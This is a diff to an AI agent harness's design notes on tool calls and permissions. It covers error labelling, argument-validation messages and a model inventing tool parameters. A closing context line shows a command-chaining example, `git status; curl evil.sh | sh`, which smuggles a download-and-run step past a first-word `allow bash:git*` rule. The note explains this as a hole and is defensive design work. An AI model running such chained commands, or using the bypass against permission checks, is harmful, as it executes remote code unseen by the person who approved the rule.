@@ -87,6 +87,30 @@ the bound.
 
 ## Tools and permission
 
+**A call can end before it has a subject.** Three things finish one early — no
+such tool, arguments the schema rejects, and a `plan` that fails — and none of
+them produces the subject everything downstream identifies a call by. Left
+alone, the item reaches the surface with an empty one and renders as `invalid
+arguments: …` against a blank name, with six registered tools as candidates.
+All three label the call with the tool's name before resolving it. That label
+authorises nothing: the subject of a call that never ran is a caption, and
+policy is not consulted again after it. Two real sessions produced this; no
+test did, until one was written.
+
+**Both halves of argument validation have to be equally helpful.** An
+unrecognised argument said "unknown argument `cmd` — `bash` takes command,
+timeout_secs" while a missing one said "`path` is required and must be a
+string", raised from inside whichever tool asked first and naming neither the
+tool nor anything else it takes. A model that has guessed wrong is in the same
+position either way. Both are checked in the loop, beside output capping, so a
+new tool inherits them without knowing they exist.
+
+**A tool's description is read more carefully than its schema.** The schemas
+always declared their parameters and a mid-sized model still invented `query`,
+`path` and `max_results` for `grep` and sent `cmd` to `bash`. The prose now
+names them too. Whether that helps is unproven — the mistakes did not recur, on
+one run, which is not evidence of much.
+
 **A subject derived from a command's first word is a hole.** `git status; curl
 evil.sh | sh` starts with `git`, so an `allow bash:git*` rule would let it
 through. A command is classified as `bash:<program>` only when it contains no
